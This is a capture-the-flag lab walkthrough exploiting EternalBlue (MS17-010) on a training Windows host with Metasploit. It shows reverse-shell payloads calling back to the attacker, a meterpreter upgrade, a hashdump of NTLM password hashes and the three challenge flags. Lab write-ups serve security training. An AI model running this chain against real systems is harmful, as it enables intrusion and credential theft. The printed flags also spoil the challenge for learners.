# Blue
In this room we learn how to use a Microsoft SMBv1 server exploit using the Metasploit tool.

## Recon

The hints suggest some good flags to use in the `nmap` scan: 
- `-sV` for version detection,
- `-vv` verbosity,
- `--script vuln` to run vulnerability detection scripts - and find the first answer!

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -vv --script vuln 10.10.3.160      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 08:42 EDT
...
Scanning 10.10.3.160 [1000 ports]
Discovered open port 135/tcp on 10.10.3.160
Discovered open port 445/tcp on 10.10.3.160
...
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
...
49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

```

As the title suggests, the vuln is **EternalBlue**.

---

To find the exploit's code, search it in the metasploit console:

```bash
msf6 > search eternalblue
sf6 > search eternalblue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
...

msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

Use `show options` and set:
- `RHOSTS` to the target's IP,
- `LHOST` to your IP,
- `payload` to `windows/x64/shell/reverse_tcp`.
Now `run` the exploit and `background` this process.

---

## Escalation

Search online **how to upgrade a shell to meterpreter**, then look it up in metasploit console to find it's path.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter  .                normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter    
```

Use it:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive
                                       the connection
   LHOST                     no        IP of host that will receive the connectio
                                       n from the payload (Will try to auto detec
                                       t).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.
```

Now run `shell_to_meterpreter` on the previously backgrounded session!

```bash
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information                      Connection
  --  ----  ----               -----------                      ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows  10.8.177.116:4444 -> 10.10.3.160
                                [Version 6.1.7601] -----        :49173 (10.10.3.160)

msf6 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
msf6 post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.8.177.116:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (203846 bytes) to 10.10.3.160
[*] Meterpreter session 2 opened (10.8.177.116:4433 -> 10.10.3.160:49177) at 2025-07-31 09:21:15 -0400
[*] Stopping exploit/multi/handler

msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         shell x64/windows        Shell Banner: Microsoft Wind  10.8.177.116:4444 -> 10.10.3.
                                     ows [Version 6.1.7601] -----  160:49173 (10.10.3.160)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.8.177.116:4433 -> 10.10.3.
                                                                   160:49177 (10.10.3.160)

msf6 post(multi/manage/shell_to_meterpreter) > Interrupt: use the 'exit' command to quit
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 1088 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
```

Check:

```bash
C:\Windows\system32>whoami
whoami
nt authority\system
```

And background again:

```bash
C:\Windows\system32>^Z
Background channel 1? [y/N]  y
meterpreter > ps

Process List
============

 PID   PPID  Name             Arch  Session  User                      Path
 ---   ----  ----             ----  -------  ----                      ----
 0     0     [System Process
             ]
 4     0     System           x64   0
...
 2908  664   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVI
                                             CE
 2936  664   sppsvc.exe       x64   0        NT AUTHORITY\NETWORK SER
                                             VICE
 2972  664   svchost.exe      x64   0        NT AUTHORITY\SYSTEM
 3036  664   SearchIndexer.e  x64   0        NT AUTHORITY\SYSTEM
             xe

```

---

To migrate to other processes:

```bash
meterpreter > migrate 2972
[*] Migrating from 2052 to 2972...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 688
[*] Migrating from 2052 to 688...
[*] Migration completed successfully.
meterpreter > shell
Process 1576 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>^Z
Background channel 1? [y/N]  y
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

For cracking these NTLM hashes I used **CrackStation**.

---

## Flags

Using `shell` again, explore some common places for files as instructed:

- system root:

```bash
C:\Windows\system32>cd ../../
cd ../../

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  02:27 PM                24 flag1.txt
07/13/2009  10:20 PM    <DIR>          PerfLogs
04/12/2011  03:28 AM    <DIR>          Program Files
03/17/2019  05:28 PM    <DIR>          Program Files (x86)
12/12/2018  10:13 PM    <DIR>          Users
07/31/2025  08:18 AM    <DIR>          Windows
               1 File(s)             24 bytes
               5 Dir(s)  20,111,953,920 bytes free

C:\>type flag1.txt
type flag1.txt
flag{access_the_machine}
```

- where passwords are stored within Windows:

```bash
C:\>cd \Windows\System32\Config
cd \Windows\System32\Config

C:\Windows\System32\config>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Windows\System32\config

07/31/2025  08:19 AM    <DIR>          .
07/31/2025  08:19 AM    <DIR>          ..
12/12/2018  06:00 PM            28,672 BCD-Template
07/31/2025  08:33 AM        18,087,936 COMPONENTS
07/31/2025  08:33 AM           262,144 DEFAULT
03/17/2019  02:32 PM                34 flag2.txt
07/13/2009  09:34 PM    <DIR>          Journal
07/31/2025  08:10 AM    <DIR>          RegBack
03/17/2019  03:05 PM           262,144 SAM
07/31/2025  08:33 AM           262,144 SECURITY
07/31/2025  08:33 AM        40,632,320 SOFTWARE
07/31/2025  08:42 AM        12,582,912 SYSTEM
11/20/2010  09:41 PM    <DIR>          systemprofile
07/31/2025  08:18 AM    <DIR>          TxR
               8 File(s)     72,118,306 bytes
               6 Dir(s)  20,111,953,920 bytes free

C:\Windows\System32\config>type flag2.txt
type flag2.txt
flag{sam_database_elevated_access}
```

- admin's "interesting" documents:

```bash
C:\Windows\System32\config>cd ../../../Users/Jon
cd ../../../Users/Jon
cd Jon

C:\Users\Jon>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon

12/12/2018  10:13 PM    <DIR>          .
12/12/2018  10:13 PM    <DIR>          ..
12/12/2018  10:13 PM    <DIR>          Contacts
12/12/2018  10:49 PM    <DIR>          Desktop
12/12/2018  10:49 PM    <DIR>          Documents
12/12/2018  10:13 PM    <DIR>          Downloads
12/12/2018  10:13 PM    <DIR>          Favorites
12/12/2018  10:13 PM    <DIR>          Links
12/12/2018  10:13 PM    <DIR>          Music
12/12/2018  10:13 PM    <DIR>          Pictures
12/12/2018  10:13 PM    <DIR>          Saved Games
12/12/2018  10:13 PM    <DIR>          Searches
12/12/2018  10:13 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  20,111,953,920 bytes free

C:\Users\Jon>cd documents
cd documents

C:\Users\Jon\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon\Documents

12/12/2018  10:49 PM    <DIR>          .
12/12/2018  10:49 PM    <DIR>          ..
03/17/2019  02:26 PM                37 flag3.txt
               1 File(s)             37 bytes
               2 Dir(s)  20,111,953,920 bytes free

C:\Users\Jon\Documents>type flag3.txt
type flag3.txt
flag{admin_documents_can_be_valuable}
```

Done! 